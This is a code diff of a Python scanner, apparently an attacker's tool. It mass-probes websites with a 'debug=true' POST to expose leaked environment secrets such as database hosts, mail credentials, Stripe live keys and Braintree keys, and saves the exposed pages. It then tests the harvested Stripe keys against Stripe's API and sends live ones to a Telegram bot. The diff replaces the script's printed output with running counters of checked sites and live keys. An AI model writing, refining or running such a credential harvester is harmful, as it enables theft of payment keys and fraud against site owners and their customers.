@@ -1,11 +1,7 @@
 import re
 import sys
 import os
-import time
-import socket
 import urllib3
-import smtplib
-import os.path
 import requests
 from os import path
 from concurrent.futures import ThreadPoolExecutor
@@ -23,17 +19,27 @@ class xcol:
     GREY = '\033[38;2;158;158;158m'
 
 class ENV:
+    def __init__(self):
+        self.counts = {
+            "checked": 0,
+            "total_debug": 0,
+            "live_sk": 0,
+            "integration_off_sk": 0,
+            "dead_sk": 0,
+            "braintree": 0
+        }
+
     def scan(self, url):
-        rr = ''
         mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG', 'BRAINTREE_PUBLIC_KEY']
         try:
             data = {'debug': 'true'}
             r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
             resp = r.text
+            self.counts["checked"] += 1
             if any(key in resp for key in mch):
-                rr = f'{xcol.LGREEN}[+]{xcol.RESET} : https://{url}'
                 with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                     output.write(f'{resp}\n')
+                self.counts["total_debug"] += 1
                 if "sk_live" in resp:
                     with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                         output.write(f'{resp}\n')
@@ -44,11 +50,12 @@ class ENV:
                 if "BRAINTREE_PUBLIC_KEY" in resp:
                     with open('Braintree.txt', 'a') as file_object:
                         file_object.write(f'Braintree : {url}\n')
+                    self.counts["braintree"] += 1
             else:
-                rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
-        except Exception as e:
-            rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url} - {e}'
-        print(rr)
+                self.counts["dead_sk"] += 1
+        except Exception:
+            self.counts["dead_sk"] += 1
+        self.update_console()
 
     def make_stripe_request(self, sk_live_key):
         url = "https://api.stripe.com/v1/payment_methods"
@@ -68,17 +75,23 @@ class ENV:
             if "id" in response_json:
                 message = f"Live sk : {sk_live_key}"
                 requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
-                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful with id")
+                self.counts["live_sk"] += 1
             else:
-                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful without id")
+                self.counts["live_sk"] += 1
         elif response.status_code == 401 and "api_key_expired" in response.text:
-            print(f"{xcol.LRED}[Stripe]{xcol.RESET} API key expired")
+            self.counts["dead_sk"] += 1
         elif "Sending credit card numbers directly to the Stripe API is generally unsafe" in response.text:
             message = f"sk integration off : {sk_live_key}"
             requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
-            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Integration off: {sk_live_key}")
+            self.counts["integration_off_sk"] += 1
         else:
-            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Request failed: {response.status_code} - {response.text}")
+            self.counts["dead_sk"] += 1
+
+    def update_console(self):
+        total_sk = self.counts['live_sk'] + self.counts['integration_off_sk'] + self.counts['dead_sk']
+        sys.stdout.write(
+            f"\rTotal Checked= {self.counts['checked']}, Total debug: {self.counts['total_debug']}, Total sk: {total_sk}, Live sk: {self.counts['live_sk']}, Integration off sk: {self.counts['integration_off_sk']}, Dead sk: {self.counts['dead_sk']}, Braintree: {self.counts['braintree']}")
+        sys.stdout.flush()
 
 if __name__ == '__main__':
     os.system('clear')
@@ -88,7 +101,7 @@ if __name__ == '__main__':
 ██║   ██║██████╔╝██║         ██║  ██║█████╗  ██████╔╝██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
 ██║   ██║██╔══██╗██║         ██║  ██║██╔══╝  ██╔══██╗██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
 ╚██████╔╝██║  ██║███████╗    ██████╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
- ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝  ╚══════╝╚═╝  ╚═╝
+ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚══════╝╚═╝  ╚═╝
                                                                                                 
 
   \u001B[0m""")
